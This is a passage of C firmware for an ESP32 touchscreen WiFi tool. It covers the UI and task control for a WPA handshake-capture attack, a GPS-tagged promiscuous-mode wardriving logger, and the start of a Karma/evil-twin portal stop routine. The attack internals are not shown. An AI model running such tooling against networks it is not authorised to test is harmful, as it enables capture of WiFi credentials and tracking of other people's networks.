    lv_obj_set_width(hs_ui_status_label, 130);
    lv_label_set_long_mode(hs_ui_status_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
    lv_obj_align(hs_ui_status_label, LV_ALIGN_BOTTOM_LEFT, 6, -3);

    // ─── "HANDSHAKE PROGRESS" header (above progress box) ─────────
    lv_obj_t *hdr_progress = lv_label_create(function_page);
    lv_label_set_text(hdr_progress, "HANDSHAKE PROGRESS");
    lv_obj_set_style_text_color(hdr_progress, lv_color_make(76, 175, 80), 0);
    lv_obj_set_style_text_font(hdr_progress, &lv_font_montserrat_12, 0);
    lv_obj_align(hdr_progress, LV_ALIGN_TOP_MID, 0, 96);

    // ─── Beacon + M1-M4 Progress row ──────────────────────────────
    lv_obj_t *progress_box = lv_obj_create(function_page);
    lv_obj_set_size(progress_box, lv_pct(97), 42);
    lv_obj_align(progress_box, LV_ALIGN_TOP_MID, 0, 112);
    lv_obj_set_style_bg_color(progress_box, lv_color_make(20, 20, 30), 0);
    lv_obj_set_style_border_color(progress_box, lv_color_make(76, 175, 80), 0);
    lv_obj_set_style_border_width(progress_box, 2, 0);
    lv_obj_set_style_radius(progress_box, 10, 0);
    lv_obj_set_style_pad_all(progress_box, 0, 0);
    lv_obj_clear_flag(progress_box, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(progress_box, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(progress_box, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    // Beacon icon
    hs_ui_beacon_label = lv_label_create(progress_box);
    lv_label_set_text(hs_ui_beacon_label, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_color(hs_ui_beacon_label, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_text_font(hs_ui_beacon_label, &lv_font_montserrat_14, 0);

    // M1-M4 indicators
    hs_ui_m1_label = lv_label_create(progress_box);
    lv_label_set_text(hs_ui_m1_label, "M1");
    lv_obj_set_style_text_color(hs_ui_m1_label, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_text_font(hs_ui_m1_label, &lv_font_montserrat_14, 0);

    hs_ui_m2_label = lv_label_create(progress_box);
    lv_label_set_text(hs_ui_m2_label, "M2");
    lv_obj_set_style_text_color(hs_ui_m2_label, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_text_font(hs_ui_m2_label, &lv_font_montserrat_14, 0);

    hs_ui_m3_label = lv_label_create(progress_box);
    lv_label_set_text(hs_ui_m3_label, "M3");
    lv_obj_set_style_text_color(hs_ui_m3_label, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_text_font(hs_ui_m3_label, &lv_font_montserrat_14, 0);

    hs_ui_m4_label = lv_label_create(progress_box);
    lv_label_set_text(hs_ui_m4_label, "M4");
    lv_obj_set_style_text_color(hs_ui_m4_label, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_text_font(hs_ui_m4_label, &lv_font_montserrat_14, 0);

    // ─── Stats bar ────────────────────────────────────────────────
    hs_ui_stats_label = lv_label_create(function_page);
    lv_label_set_text(hs_ui_stats_label, "APs: 0  Cli: 0  Cap: 0");
    lv_obj_set_style_text_color(hs_ui_stats_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(hs_ui_stats_label, &lv_font_montserrat_12, 0);
    lv_obj_set_width(hs_ui_stats_label, lv_pct(95));
    lv_label_set_long_mode(hs_ui_stats_label, LV_LABEL_LONG_WRAP);
    lv_obj_align(hs_ui_stats_label, LV_ALIGN_TOP_MID, 0, 160);

    // ─── Stop & Exit button (compact row) ─────────────────────────
    handshake_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(handshake_stop_btn, 110, 28);
    lv_obj_align(handshake_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(handshake_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(handshake_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(handshake_stop_btn, 0, 0);
    lv_obj_set_style_radius(handshake_stop_btn, 8, 0);
    lv_obj_set_style_shadow_width(handshake_stop_btn, 4, 0);
    lv_obj_set_style_shadow_color(handshake_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(handshake_stop_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(handshake_stop_btn, 4, 0);
    lv_obj_set_style_pad_hor(handshake_stop_btn, 8, 0);
    lv_obj_set_style_pad_column(handshake_stop_btn, 4, 0);
    lv_obj_set_flex_flow(handshake_stop_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(handshake_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *x_icon = lv_label_create(handshake_stop_btn);
    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);

    lv_obj_t *stop_text = lv_label_create(handshake_stop_btn);
    lv_label_set_text(stop_text, "Stop & Exit");
    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);

    lv_obj_add_event_cb(handshake_stop_btn, handshake_stop_btn_cb, LV_EVENT_CLICKED, NULL);

    // ─── Start the timer for UI updates ───────────────────────────
    hs_ui_timer = lv_timer_create(hs_ui_timer_cb, 500, NULL);

    handshake_enable_log_capture();
    handshake_log_ta = NULL;

    // ─── Start handshake attack task ──────────────────────────────
    handshake_attack_active = true;

    handshake_attack_task_stack = (StackType_t *)heap_caps_malloc(32768 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (handshake_attack_task_stack != NULL) {
        handshake_attack_task_handle = xTaskCreateStatic(
            handshake_attack_task, "hs_attack", 32768, NULL, 5,
            handshake_attack_task_stack, &handshake_attack_task_buffer
        );
        if (handshake_attack_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create handshake attack task!");
            handshake_attack_active = false;
            heap_caps_free(handshake_attack_task_stack);
            handshake_attack_task_stack = NULL;
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate PSRAM stack for handshake attack task!");
        handshake_attack_active = false;
    }

    show_touch_dot = false;
    if (touch_dot) lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
}

static void handshake_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    g_operation_stop_requested = true;
    handshake_attack_active = false;
    attack_handshake_stop();
    
    // Wait for task to self-delete (it sets handle to NULL before vTaskDelete)
    TaskHandle_t h = handshake_attack_task_handle;
    if (h != NULL) {
        ESP_LOGI(TAG, "Stopping handshake attack task...");
        for (int i = 0; i < 50; i++) {
            if (handshake_attack_task_handle == NULL) {
                ESP_LOGI(TAG, "Handshake attack task exited cleanly.");
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        // If still alive after 5s, force kill
        h = handshake_attack_task_handle;
        if (h != NULL) {
            ESP_LOGW(TAG, "Force-deleting handshake attack task.");
            vTaskDelete(h);
            handshake_attack_task_handle = NULL;
        }
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    if (handshake_attack_task_stack != NULL) {
        heap_caps_free(handshake_attack_task_stack);
        handshake_attack_task_stack = NULL;
    }
    
    handshake_cleanup();

    handshake_attack_active = false;
    handshake_disable_log_capture();
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    handshake_status_list = NULL;
    handshake_ui_active = false;
    scan_done_ui_flag = false;

    if (hs_ui_timer) { lv_timer_del(hs_ui_timer); hs_ui_timer = NULL; }
    hs_ui_channel_label = NULL;
    hs_ui_target_label = NULL;
    hs_ui_beacon_label = NULL;
    hs_ui_m1_label = NULL;
    hs_ui_m2_label = NULL;
    hs_ui_m3_label = NULL;
    hs_ui_m4_label = NULL;
    hs_ui_stats_label = NULL;
    hs_ui_status_label = NULL;

    ESP_LOGI(TAG, "All operations stopped.");
    nav_to_menu_flag = true;
}

// Wardrive task kept as wrapper
static void wardrive_task(void *pvParameters) {
    (void)pvParameters;
    wardrive_promisc_task(pvParameters);
}

// Wardrive promisc task: D-UCB channel selection + beacon sniffing
static void wardrive_promisc_task(void *pvParameters) {
    (void)pvParameters;
    ESP_LOGI(TAG, "Wardrive promisc task started");

    wardrive_file_counter = (int)(esp_timer_get_time() / 1000000);

    wdp_seen_count = 0;
    wdp_dwell_new_networks = 0;
    wdp_needs_grow = false;
    if (wdp_seen_networks) memset(wdp_seen_networks, 0, (size_t)wdp_seen_capacity * sizeof(wdp_network_t));

    ESP_LOGI(TAG, "Waiting for GPS fix...");
    while (wardrive_active && !current_gps.valid) {
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char *line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                parse_gps_nmea(line);
                line = strtok(NULL, "\r\n");
            }
        }
        wd_ui_update_flag = true;
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (!wardrive_active) {
        wardrive_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    ESP_LOGI(TAG, "GPS fix obtained! Lat:%.6f Lon:%.6f Sats:%d",
             current_gps.latitude, current_gps.longitude, current_gps.satellites);

    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
    struct stat st = {0};
    if (stat("/sdcard/lab/wardrives", &st) == -1) {
        mkdir("/sdcard/lab", 0777);
        mkdir("/sdcard/lab/wardrives", 0700);
    }
    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);

    char filename[64];
    snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);

    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
    FILE *file = fopen(filename, "w");
    if (!file) {
        ESP_LOGI(TAG, "Failed to create %s - aborting", filename);
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
        wardrive_active = false;
        wardrive_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board\n");
    fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
    fflush(file);
    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);

    wdp_ducb_init();

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wdp_promiscuous_cb);
    esp_wifi_set_promiscuous(true);

    int64_t last_stats_us = esp_timer_get_time();
    int networks_since_flush = 0;

    while (wardrive_active) {
        int ch_idx = wdp_ducb_select_channel();
        int channel = wdp_ducb_channels[ch_idx].channel;
        int dwell_ms = wdp_get_dwell_ms(wdp_ducb_channels[ch_idx].tier);

        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
        wdp_current_channel = channel;
        wd_ui_update_flag = true;
        wdp_dwell_new_networks = 0;
        vTaskDelay(pdMS_TO_TICKS(dwell_ms));

        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(50));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char *line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) { parse_gps_nmea(line); line = strtok(NULL, "\r\n"); }
        }

        if (!current_gps.valid) {
            ESP_LOGI(TAG, "[WDP] GPS fix lost, pausing promisc...");
            esp_wifi_set_promiscuous(false);
            while (wardrive_active && !current_gps.valid) {
                len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
                if (len > 0) {
                    wardrive_gps_buffer[len] = '\0';
                    char *l = strtok(wardrive_gps_buffer, "\r\n");
                    while (l) { parse_gps_nmea(l); l = strtok(NULL, "\r\n"); }
                }
                vTaskDelay(pdMS_TO_TICKS(500));
            }
            if (!wardrive_active) break;
            ESP_LOGI(TAG, "[WDP] GPS fix re-acquired, resuming promisc.");
            esp_wifi_set_promiscuous(true);
        }

        if (wdp_needs_grow) wdp_grow_network_buffer();

        double reward = (double)wdp_dwell_new_networks;
        wdp_ducb_update(ch_idx, reward);
        wd_ui_update_flag = true;

        if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        for (int i = 0; i < wdp_seen_count; i++) {
            if (wdp_seen_networks[i].written_to_file) continue;
            wdp_network_t *net = &wdp_seen_networks[i];
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     net->bssid[0], net->bssid[1], net->bssid[2],
                     net->bssid[3], net->bssid[4], net->bssid[5]);
            char escaped_ssid[64];
            escape_csv_field(net->ssid, escaped_ssid, sizeof(escaped_ssid));
            const char *auth = get_auth_mode_wiggle(net->authmode);
            fprintf(file, "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,0.00,0.00,WIFI\n",
                    mac_str, escaped_ssid, auth, timestamp,
                    net->channel, net->rssi, net->latitude, net->longitude);
            net->written_to_file = true;
            networks_since_flush++;
        }
        if (networks_since_flush >= WDP_FILE_FLUSH_INTERVAL) {
            fflush(file);
            networks_since_flush = 0;
        }
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);

        int64_t now = esp_timer_get_time();
        if (now - last_stats_us >= WDP_STATS_INTERVAL_US) {
            ESP_LOGI(TAG, "[WDP-STATS] Total:%d Ch:%d Tier:%d GPS:%s Sats:%d",
                     wdp_seen_count, channel, wdp_ducb_channels[ch_idx].tier,
                     current_gps.valid ? "Y" : "N", current_gps.satellites);
            last_stats_us = now;
        }
    }

    esp_wifi_set_promiscuous(false);

    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
    if (file) { fflush(file); fclose(file); }
    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);

    wardrive_active = false;
    wardrive_task_handle = NULL;
    ESP_LOGI(TAG, "Wardrive promisc stopped. Total networks: %d. File: w%d.log",
             wdp_seen_count, wardrive_file_counter);
    vTaskDelete(NULL);
}

// Timer callback for wardrive dashboard UI (every 1s)
static void wd_ui_timer_cb(lv_timer_t *timer) {
    (void)timer;
    if (!wardrive_ui_active) return;

    if (wd_ui_channel_label) {
        char wd_ch_buf[16];
        snprintf(wd_ch_buf, sizeof(wd_ch_buf), "CH %d", wdp_current_channel);
        lv_label_set_text(wd_ui_channel_label, wd_ch_buf);
    }

    // GPS status
    if (wd_ui_gps_label) {
        char gps_buf[80];
        if (current_gps.valid) {
            snprintf(gps_buf, sizeof(gps_buf), LV_SYMBOL_GPS " %.5f, %.5f  Sats: %d",
                     current_gps.latitude, current_gps.longitude, current_gps.satellites);
            lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_GREEN, 0);
        } else {
            snprintf(gps_buf, sizeof(gps_buf), "Waiting for GPS fix...  Sats: %d", current_gps.satellites);
            lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
        }
        lv_label_set_text(wd_ui_gps_label, gps_buf);
    }

    // Total networks counter
    if (wd_ui_counter_label) {
        char cnt_buf[32];
        snprintf(cnt_buf, sizeof(cnt_buf), "%d", wdp_seen_count);
        lv_label_set_text(wd_ui_counter_label, cnt_buf);
    }

    // Update table with last 50 networks
    if (wd_ui_table) {
        int total = wdp_seen_count;
        int show = (total > 50) ? 50 : total;
        int start = total - show;
        lv_table_set_row_cnt(wd_ui_table, show > 0 ? show : 1);
        lv_table_set_col_cnt(wd_ui_table, 5);

        for (int i = 0; i < show; i++) {
            wdp_network_t *net = &wdp_seen_networks[start + show - 1 - i];
            char ssid_trunc[20];
            strncpy(ssid_trunc, net->ssid[0] ? net->ssid : "[hidden]", 19);
            ssid_trunc[19] = '\0';
            lv_table_set_cell_value(wd_ui_table, i, 0, ssid_trunc);

            char ch_str[4];
            snprintf(ch_str, sizeof(ch_str), "%d", net->channel);
            lv_table_set_cell_value(wd_ui_table, i, 1, ch_str);

            char rssi_str[8];
            snprintf(rssi_str, sizeof(rssi_str), "%d", net->rssi);
            lv_table_set_cell_value(wd_ui_table, i, 2, rssi_str);

            const char *auth = get_auth_mode_wiggle(net->authmode);
            char auth_short[8];
            strncpy(auth_short, auth, 7);
            auth_short[7] = '\0';
            lv_table_set_cell_value(wd_ui_table, i, 3, auth_short);

            char coord_str[24];
            if (net->latitude != 0.0f || net->longitude != 0.0f) {
                snprintf(coord_str, sizeof(coord_str), "%.2f", (double)net->latitude);
            } else {
                snprintf(coord_str, sizeof(coord_str), "--");
            }
            lv_table_set_cell_value(wd_ui_table, i, 4, coord_str);
        }
    }
}

static void wardrive_start_btn_cb(lv_event_t *e)
{
    (void)e;

    scan_done_ui_flag = false;

    create_function_page_base("Wardrive");
    wardrive_ui_active = true;

    // ─── GPS status bar (top) ─────────────────────────────────────
    // Parent to lv_layer_top() so this label renders above the D-UCB and
    // Networks boxes regardless of child creation order.
    wd_ui_gps_label = lv_label_create(lv_layer_top());
    lv_label_set_text(wd_ui_gps_label, "Waiting for GPS fix...  Sats: 0");
    lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(wd_ui_gps_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_align(wd_ui_gps_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_bg_opa(wd_ui_gps_label, LV_OPA_TRANSP, 0);
    lv_obj_set_width(wd_ui_gps_label, LCD_H_RES);
    lv_obj_align(wd_ui_gps_label, LV_ALIGN_TOP_MID, 0, 35);

    // ─── D-UCB Channel indicator (below GPS label) ───────────────
    lv_obj_t *wd_ch_box = lv_obj_create(function_page);
    lv_obj_set_size(wd_ch_box, 90, 42);
    lv_obj_align(wd_ch_box, LV_ALIGN_TOP_RIGHT, -126, 55);
    lv_obj_set_style_bg_color(wd_ch_box, lv_color_make(30, 30, 45), 0);
    lv_obj_set_style_border_color(wd_ch_box, lv_color_make(76, 175, 80), 0);
    lv_obj_set_style_border_width(wd_ch_box, 2, 0);
    lv_obj_set_style_radius(wd_ch_box, 10, 0);
    lv_obj_set_style_pad_all(wd_ch_box, 0, 0);
    lv_obj_clear_flag(wd_ch_box, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *wd_ch_title = lv_label_create(wd_ch_box);
    lv_label_set_text(wd_ch_title, "D-UCB");
    lv_obj_set_style_text_color(wd_ch_title, lv_color_make(76, 175, 80), 0);
    lv_obj_set_style_text_font(wd_ch_title, &lv_font_montserrat_12, 0);
    lv_obj_align(wd_ch_title, LV_ALIGN_TOP_MID, 0, 2);

    wd_ui_channel_label = lv_label_create(wd_ch_box);
    lv_label_set_text(wd_ui_channel_label, "CH --");
    lv_obj_set_style_text_color(wd_ui_channel_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(wd_ui_channel_label, &lv_font_montserrat_16, 0);
    lv_obj_align(wd_ui_channel_label, LV_ALIGN_BOTTOM_MID, 0, -2);

    // ─── Network counter (below GPS label) ───────────────────────
    lv_obj_t *cnt_box = lv_obj_create(function_page);
    lv_obj_set_size(cnt_box, 110, 42);
    lv_obj_align(cnt_box, LV_ALIGN_TOP_RIGHT, -8, 55);
    lv_obj_set_style_bg_color(cnt_box, lv_color_make(30, 30, 45), 0);
    lv_obj_set_style_border_color(cnt_box, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_border_width(cnt_box, 2, 0);
    lv_obj_set_style_radius(cnt_box, 10, 0);
    lv_obj_set_style_pad_all(cnt_box, 0, 0);
    lv_obj_clear_flag(cnt_box, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *cnt_title = lv_label_create(cnt_box);
    lv_label_set_text(cnt_title, "NETWORKS");
    lv_obj_set_style_text_color(cnt_title, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_text_font(cnt_title, &lv_font_montserrat_12, 0);
    lv_obj_align(cnt_title, LV_ALIGN_TOP_MID, 0, 2);

    wd_ui_counter_label = lv_label_create(cnt_box);
    lv_label_set_text(wd_ui_counter_label, "0");
    lv_obj_set_style_text_color(wd_ui_counter_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(wd_ui_counter_label, &lv_font_montserrat_20, 0);
    lv_obj_align(wd_ui_counter_label, LV_ALIGN_BOTTOM_MID, 0, -2);

    // ─── Recent networks table ────────────────────────────────────
    // y=101: boxes end at 55+42=97, 4px gap. height=164: stops 4px above stop btn.
    // Frozen header row — 1-row table, no scrolling
    wd_ui_header = lv_table_create(function_page);
    lv_obj_set_size(wd_ui_header, lv_pct(97), LV_SIZE_CONTENT);
    lv_obj_align(wd_ui_header, LV_ALIGN_TOP_MID, 0, 101);
    lv_obj_set_style_bg_color(wd_ui_header, lv_color_make(30, 30, 30), 0);
    lv_obj_set_style_border_color(wd_ui_header, lv_color_make(50, 50, 50), 0);
    lv_obj_set_style_border_width(wd_ui_header, 1, 0);
    lv_obj_set_style_border_side(wd_ui_header, LV_BORDER_SIDE_LEFT | LV_BORDER_SIDE_RIGHT | LV_BORDER_SIDE_TOP, 0);
    lv_obj_set_style_radius(wd_ui_header, 6, 0);
    lv_obj_set_style_text_font(wd_ui_header, &lv_font_montserrat_12, 0);
    // Cell styles must target LV_PART_ITEMS — base-state text/bg don't reach cells in LVGL 8
    lv_obj_set_style_bg_color(wd_ui_header, lv_color_white(), LV_PART_ITEMS);
    lv_obj_set_style_bg_opa(wd_ui_header, LV_OPA_COVER, LV_PART_ITEMS);
    lv_obj_set_style_text_color(wd_ui_header, lv_color_make(20, 20, 20), LV_PART_ITEMS);
    lv_obj_set_style_text_font(wd_ui_header, &lv_font_montserrat_12, LV_PART_ITEMS);
    lv_obj_set_style_pad_top(wd_ui_header, 2, LV_PART_ITEMS);
    lv_obj_set_style_pad_bottom(wd_ui_header, 2, LV_PART_ITEMS);
    lv_obj_set_style_pad_left(wd_ui_header, 4, LV_PART_ITEMS);
    lv_obj_set_style_pad_right(wd_ui_header, 2, LV_PART_ITEMS);
    lv_obj_set_scroll_dir(wd_ui_header, LV_DIR_NONE);
    lv_obj_set_scrollbar_mode(wd_ui_header, LV_SCROLLBAR_MODE_OFF);
    lv_table_set_col_cnt(wd_ui_header, 5);
    lv_table_set_col_width(wd_ui_header, 0, 82);
    lv_table_set_col_width(wd_ui_header, 1, 26);
    lv_table_set_col_width(wd_ui_header, 2, 36);
    lv_table_set_col_width(wd_ui_header, 3, 44);
    lv_table_set_col_width(wd_ui_header, 4, 45);
    lv_table_set_row_cnt(wd_ui_header, 1);
    lv_table_set_cell_value(wd_ui_header, 0, 0, "SSID");
    lv_table_set_cell_value(wd_ui_header, 0, 1, "Ch");
    lv_table_set_cell_value(wd_ui_header, 0, 2, "RSSI");
    lv_table_set_cell_value(wd_ui_header, 0, 3, "Auth");
    lv_table_set_cell_value(wd_ui_header, 0, 4, "Lat");

    // Scrollable data table — sits below the frozen header
    wd_ui_table = lv_table_create(function_page);
    lv_obj_set_size(wd_ui_table, lv_pct(97), 160);
    lv_obj_align(wd_ui_table, LV_ALIGN_TOP_MID, 0, 121);
    lv_obj_set_style_bg_color(wd_ui_table, lv_color_make(15, 15, 15), 0);
    lv_obj_set_style_border_color(wd_ui_table, lv_color_make(50, 50, 50), 0);
    lv_obj_set_style_border_width(wd_ui_table, 1, 0);
    lv_obj_set_style_border_side(wd_ui_table, LV_BORDER_SIDE_LEFT | LV_BORDER_SIDE_RIGHT | LV_BORDER_SIDE_BOTTOM, 0);
    lv_obj_set_style_radius(wd_ui_table, 6, 0);
    lv_obj_set_style_text_font(wd_ui_table, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(wd_ui_table, lv_color_make(200, 200, 200), 0);
    lv_obj_set_style_pad_top(wd_ui_table, 0, LV_PART_ITEMS);
    lv_obj_set_style_pad_bottom(wd_ui_table, 0, LV_PART_ITEMS);
    lv_obj_set_style_pad_left(wd_ui_table, 4, LV_PART_ITEMS);
    lv_obj_set_style_pad_right(wd_ui_table, 2, LV_PART_ITEMS);

    // Column widths sum to 233 px (= lv_pct(97) of 240). Vertical scroll only.
    lv_table_set_col_cnt(wd_ui_table, 5);
    lv_table_set_col_width(wd_ui_table, 0, 82);   // SSID
    lv_table_set_col_width(wd_ui_table, 1, 26);   // Ch
    lv_table_set_col_width(wd_ui_table, 2, 36);   // RSSI
    lv_table_set_col_width(wd_ui_table, 3, 44);   // Auth
    lv_table_set_col_width(wd_ui_table, 4, 45);   // Lat
    lv_obj_set_scroll_dir(wd_ui_table, LV_DIR_VER);
    lv_obj_set_scrollbar_mode(wd_ui_table, LV_SCROLLBAR_MODE_AUTO);
    lv_table_set_row_cnt(wd_ui_table, 1);

    // ─── Stop button (bottom center) ─────────────────────────────
    wardrive_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(wardrive_stop_btn, 110, 30);
    lv_obj_align(wardrive_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
    lv_obj_set_style_bg_color(wardrive_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(wardrive_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(wardrive_stop_btn, 0, 0);
    lv_obj_set_style_radius(wardrive_stop_btn, 8, 0);
    lv_obj_set_style_shadow_width(wardrive_stop_btn, 4, 0);
    lv_obj_set_style_shadow_color(wardrive_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_flex_flow(wardrive_stop_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(wardrive_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(wardrive_stop_btn, 6, 0);
    lv_obj_t *x_icon2 = lv_label_create(wardrive_stop_btn);
    lv_label_set_text(x_icon2, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon2, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(x_icon2, ui_text_color(), 0);
    lv_obj_t *stop_lbl = lv_label_create(wardrive_stop_btn);
    lv_label_set_text(stop_lbl, "Stop");
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(stop_lbl, ui_text_color(), 0);
    lv_obj_add_event_cb(wardrive_stop_btn, wardrive_stop_btn_cb, LV_EVENT_CLICKED, NULL);

    // ─── Start timer for UI updates ──────────────────────────────
    wd_ui_timer = lv_timer_create(wd_ui_timer_cb, 1000, NULL);

    wardrive_enable_log_capture();

    if (wardrive_active || wardrive_task_handle != NULL) {
        ESP_LOGI(TAG, "Wardrive already running");
        return;
    }

    ESP_LOGI(TAG, "Starting Wardrive (promisc+D-UCB)...");
    wardrive_active = true;

    wardrive_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (wardrive_task_stack != NULL) {
        wardrive_task_handle = xTaskCreateStatic(wardrive_task, "wardrive_task", 8192, NULL,
            5, wardrive_task_stack, &wardrive_task_buffer);
        if (wardrive_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create wardrive task");
            heap_caps_free(wardrive_task_stack);
            wardrive_task_stack = NULL;
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate wardrive task stack from PSRAM");
    }

    show_touch_dot = false;
    if (touch_dot) lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
}

static void wardrive_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop wardrive
    if (wardrive_active || wardrive_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Wardrive...");
        wardrive_active = false;
        
        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
            // Free PSRAM stack
            if (wardrive_task_stack != NULL) {
                heap_caps_free(wardrive_task_stack);
                wardrive_task_stack = NULL;
            }
        }
        
        ESP_LOGI(TAG, "Wardrive stopped");
    }
    
    esp_wifi_set_promiscuous(false);
    wardrive_disable_log_capture();
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    wardrive_ui_active = false;
    scan_done_ui_flag = false;

    if (wd_ui_timer) { lv_timer_del(wd_ui_timer); wd_ui_timer = NULL; }
    if (wd_ui_gps_label && lv_obj_is_valid(wd_ui_gps_label)) lv_obj_del(wd_ui_gps_label);
    wd_ui_gps_label = NULL;
    wd_ui_counter_label = NULL;
    wd_ui_channel_label = NULL;
    wd_ui_header = NULL;
    wd_ui_table = NULL;
    wdp_current_channel = 0;

    nav_to_menu_flag = true;
}

// Back To Observer callback from Karma screen
static void karma_back_to_observer_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop Karma if it's running
    if (karma_ui_active) {
        ESP_LOGI(TAG, "Stopping Karma before returning to Observer...");
        wifi_attacks_stop_portal();
        wifi_attacks_set_evil_twin_event_cb(NULL);
